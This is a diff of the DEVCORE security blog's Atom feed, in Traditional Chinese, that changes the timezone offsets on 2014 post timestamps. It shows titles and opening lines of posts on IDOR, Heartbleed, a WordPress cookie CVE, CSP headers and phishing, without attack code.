    <content type="html">&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;不安全的引用物件 (Insecure Direct Object Reference)&lt;/a&gt; 是個非常常見的資安漏洞，在 &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; 公布的&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;十大網站應用程式安全漏洞&lt;/a&gt; 中高居第四名。通常發生在網站應用程式上沒有針對輸入的參數做好檢查，就把參數丟入 include 或 readfile 等函數當中引用，使得攻擊者可以藉此存取任意文件的原始碼。&lt;/p&gt;
 
@@ -6867,7 +7192,7 @@ ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  <entry>
    <title>CVE-2014-0166 WordPress 偽造 Cookie 弱點</title>
    <link href="https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/"/>
-   <updated>2014-04-16T00:00:00+08:00</updated>
+   <updated>2014-04-16T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
@@ -6977,7 +7302,7 @@ hmac 值用來驗證 cookie 是否合法。&lt;br /&gt;&lt;br /&gt;
  <entry>
    <title>OpenSSL Heartbleed 全球駭客的殺戮祭典，你參與了嗎？</title>
    <link href="https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/"/>
-   <updated>2014-04-11T00:00:00+08:00</updated>
+   <updated>2014-04-11T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect</id>
    <content type="html">&lt;p&gt;你跟上了 OpenSSL Heartbleed 的祭典了嗎？如果還沒有，別忘記詳細閱讀一下我們的前文「&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞&lt;/a&gt;」。&lt;/p&gt;
 
@@ -7280,7 +7605,7 @@ sudo service apache2 restart    # Debian
  <entry>
    <title>OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 </title>
    <link href="https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/"/>
-   <updated>2014-04-09T00:00:00+08:00</updated>
+   <updated>2014-04-09T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160</id>
    <content type="html">&lt;h3 id=&quot;openssl-cve-2014-0160-嚴重漏洞&quot;&gt;OpenSSL CVE-2014-0160 嚴重漏洞&lt;/h3&gt;
 
@@ -7553,7 +7878,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
  <entry>
    <title>Content-Security-Policy - HTTP Headers 的資安議題 (2)</title>
    <link href="https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/"/>
-   <updated>2014-04-08T00:00:00+08:00</updated>
+   <updated>2014-04-08T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy</id>
    <content type="html">&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;
 
@@ -7730,7 +8055,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
  <entry>
    <title>Google 帳號釣魚案例</title>
    <link href="https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam/"/>
-   <updated>2014-03-31T00:00:00+08:00</updated>
+   <updated>2014-03-31T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam</id>
    <content type="html">&lt;p&gt;最近身邊的朋友不斷的收到 Gmail 中 Google 的警告：&lt;/p&gt;
 
@@ -7799,7 +8124,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
  <entry>
    <title>使用第三方套件所要擔負的資安風險</title>
    <link href="https://devco.re/blog/2014/03/14/3rd-party-software-security-issues/"/>
-   <updated>2014-03-14T00:00:00+08:00</updated>
+   <updated>2014-03-14T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues</id>
    <content type="html">&lt;p&gt;使用第三方套件節省開發時間，已經是整個資訊產業的慣例。但是很多管理者可能不知道，使用第三方套件到底需要擔負多大的資安風險。你確定你用的套件是安全無虞的嗎？是否有經過嚴謹的安全測試？若有安全漏洞引爆，是否有廠商可以負責維護修補？廠商開發的程式碼品質是否穩定？這些都是在使用之前必須要考慮的。&lt;/p&gt;
 
@@ -7986,7 +8311,7 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  <entry>
    <title>HTTP Headers 的資安議題 (1)</title>
    <link href="https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/"/>
-   <updated>2014-03-10T00:00:00+08:00</updated>
+   <updated>2014-03-10T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
@@ -8105,7 +8430,7 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  <entry>
    <title>奇優廣告 Qiyou 廣告手法剖析</title>
    <link href="https://devco.re/blog/2014/03/06/qiyou-ads-hijacking/"/>
-   <updated>2014-03-06T00:00:00+08:00</updated>
+   <updated>2014-03-06T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking</id>
    <content type="html">&lt;p&gt;歡迎來到我們的技術文章專欄！&lt;/p&gt;
 
@@ -8183,7 +8508,7 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  <entry>
    <title>DEVCORE 新網站上線！</title>
    <link href="https://devco.re/blog/2014/02/27/devcore-new-website/"/>
-   <updated>2014-02-27T00:00:00+08:00</updated>
+   <updated>2014-02-27T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2014/02/27/devcore-new-website</id>
    <content type="html">&lt;p&gt;DEVCORE 的新網站上線了！&lt;br /&gt;&lt;br /&gt;
 非常感謝專業的 &lt;a href=&quot;http://evendesign.tw/&quot;&gt;EVENDESIGN&lt;/a&gt; 幫我們設計精美的網站！&lt;br /&gt;&lt;/p&gt;
